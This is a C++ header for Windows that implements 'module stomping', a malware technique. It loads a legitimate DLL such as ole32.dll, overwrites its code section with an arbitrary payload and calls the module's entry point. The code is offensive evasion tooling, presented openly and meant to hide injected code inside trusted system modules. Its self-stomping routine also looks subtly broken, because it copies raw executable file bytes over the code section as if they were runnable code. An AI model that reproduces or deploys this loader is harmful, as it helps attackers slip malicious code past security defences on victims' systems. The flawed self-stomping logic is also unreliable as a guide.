#pragma once

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <Psapi.h>
#include <cstdint>
#include <string>
#include <vector>
#include <algorithm>

#pragma comment(lib, "Psapi.lib")

namespace nuub::domain {

// Overwrite legitimate DLL code with our payload
class ModuleStomping {
public:
    // Load a legitimate DLL and overwrite its code section with our payload
    static HMODULE stompe(const wchar_t* dll_path, const void* payload, size_t payload_size) {
        // 1. Load the legitimate DLL
        HMODULE hModule = LoadLibraryW(dll_path);
        if (!hModule) return nullptr;

        // 2. Get module info
        MODULEINFO mod_info{};
        if (!GetModuleInformation(GetCurrentProcess(), hModule, &mod_info, sizeof(mod_info))) {
            FreeLibrary(hModule);
            return nullptr;
        }

        // 3. Find the .text section (code)
        auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
        auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
            reinterpret_cast<uintptr_t>(hModule) + dos->e_lfanew);

        auto* section = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
            if (memcmp(section[i].Name, ".text", 5) == 0) {
                // Found .text section
                void* text_base = reinterpret_cast<void*>(
                    reinterpret_cast<uintptr_t>(hModule) + section[i].VirtualAddress);
                DWORD text_size = section[i].Misc.VirtualSize;

                // 4. Change protection to writable
                DWORD old_protect = 0;
                if (!VirtualProtect(text_base, text_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
                    FreeLibrary(hModule);
                    return nullptr;
                }

                // 5. Overwrite with our payload
                size_t copy_size = (std::min)(payload_size, static_cast<size_t>(text_size));
                memcpy(text_base, payload, copy_size);

                // 6. Fill remaining space with NOPs
                if (copy_size < text_size) {
                    memset(reinterpret_cast<uint8_t*>(text_base) + copy_size,
                           0x90, // NOP
                           text_size - copy_size);
                }

                // 7. Restore protection
                VirtualProtect(text_base, text_size, old_protect, &old_protect);

                // 8. Flush instruction cache
                FlushInstructionCache(GetCurrentProcess(), text_base, text_size);

                return hModule;
            }
        }

        FreeLibrary(hModule);
        return nullptr;
    }

    // Stompe a DLL and call its DllMain
    static bool stompe_and_run(const wchar_t* dll_path, const void* payload, size_t payload_size) {
        HMODULE hModule = stompe(dll_path, payload, payload_size);
        if (!hModule) return false;

        // Get DllMain address
        MODULEINFO mod_info{};
        if (!GetModuleInformation(GetCurrentProcess(), hModule, &mod_info, sizeof(mod_info))) {
            return false;
        }

        auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
        auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
            reinterpret_cast<uintptr_t>(hModule) + dos->e_lfanew);

        auto entry = reinterpret_cast<BOOL(WINAPI*)(HMODULE, DWORD, LPVOID)>(
            reinterpret_cast<uintptr_t>(hModule) + nt->OptionalHeader.AddressOfEntryPoint);

        // Call DllMain
        return entry(hModule, DLL_PROCESS_ATTACH, nullptr);
    }

    // Stompe with our own EXE
    static bool self_stompe() {
        wchar_t exe_path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

        // Read our own executable
        HANDLE hFile = CreateFileW(exe_path, GENERIC_READ, FILE_SHARE_READ,
                                   nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return false;

        DWORD file_size = GetFileSize(hFile, nullptr);
        std::vector<uint8_t> exe_data(file_size);

        DWORD bytes_read = 0;
        ReadFile(hFile, exe_data.data(), file_size, &bytes_read, nullptr);
        CloseHandle(hFile);

        if (bytes_read != file_size) return false;

        // Stompe a legitimate DLL with our code
        return stompe_and_run(L"ole32.dll", exe_data.data(), exe_data.size());
    }
};

} // namespace nuub::domain
#endif
